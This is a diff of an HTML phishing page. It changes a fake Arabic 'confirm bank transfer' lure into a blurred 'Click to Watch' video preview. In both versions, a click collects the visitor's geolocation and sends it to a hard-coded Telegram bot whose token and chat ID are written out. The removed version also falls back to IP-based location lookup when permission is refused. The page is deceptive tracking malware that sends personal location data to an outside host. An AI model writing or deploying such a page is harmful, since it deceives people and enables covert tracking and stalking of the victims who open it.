@@ -3,88 +3,81 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تحويل بنكي</title>
-
-<!-- Open Graph لتظهر الصورة كرابط -->
-<meta property="og:title" content="تحويل بنكي">
-<meta property="og:description" content="اضغط لتأكيد التحويل">
-<meta property="og:image" content="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg">
-<meta property="og:type" content="website">
-
+<title>Video Preview</title>
 <style>
   body {
     font-family: Arial, sans-serif;
-    background: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg') no-repeat center center fixed;
-    background-size: cover;
-    filter: blur(5px);
-    height: 100vh;
-    margin: 0;
+    background-color: #000;
     display: flex;
     justify-content: center;
     align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .card {
+    position: relative;
+    width: 400px;
+    height: 225px;
+    cursor: pointer;
+    overflow: hidden;
+    border-radius: 10px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.5);
+  }
+  .card img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    filter: blur(5px);
+    transition: filter 0.3s;
+  }
+  .card:hover img {
+    filter: blur(0);
   }
   .overlay {
     position: absolute;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.5);
+    top: 0; left: 0;
+    width: 100%; height: 100%;
     display: flex;
     justify-content: center;
     align-items: center;
-    cursor: pointer;
-  }
-  .overlay h1 {
     color: #fff;
-    font-size: 24px;
-    padding: 20px 40px;
-    background: rgba(0,0,0,0.6);
-    border-radius: 10px;
+    font-size: 20px;
+    font-weight: bold;
+    text-shadow: 1px 1px 5px #000;
   }
 </style>
 </head>
 <body>
 
-<div class="overlay" onclick="confirmTransfer()">
-  <h1>اضغط لتأكيد التحويل</h1>
+<div class="card" onclick="getLocation();">
+  <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="Video Preview">
+  <div class="overlay">Click to Watch</div>
 </div>
 
 <script>
-const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
-const chatId = "6495557039";
-
 function sendLocationToBot(lat, lon) {
+    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
+    const chatId = "6495557039";
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
-
+    const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
     fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: chatId, text: message })
-    }).then(res => res.json())
-      .then(data => console.log("✅ تم الإرسال:", data))
-      .catch(err => console.error("❌ خطأ:", err));
+    })
+    .then(res => res.json())
+    .then(data => console.log("✅ Sent:", data))
+    .catch(err => console.error("❌ Error:", err));
 }
 
-function confirmTransfer() {
-    document.querySelector('.overlay').style.display = 'none';
-    document.body.style.filter = 'none';
-
+function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            pos => {
-                sendLocationToBot(pos.coords.latitude, pos.coords.longitude);
-            },
-            err => {
-                console.warn("⚠️ تم رفض الموقع، محاولة IP fallback...");
-                fetch('https://ipapi.co/json/')
-                    .then(res => res.json())
-                    .then(data => {
-                        sendLocationToBot(data.latitude, data.longitude);
-                    });
-            }
+            pos => sendLocationToBot(pos.coords.latitude, pos.coords.longitude),
+            err => console.error("⚠️ Permission denied")
         );
     } else {
-        alert("المتصفح لا يدعم تحديد الموقع");
+        console.error("⚠️ Geolocation not supported");
     }
 }
 </script>
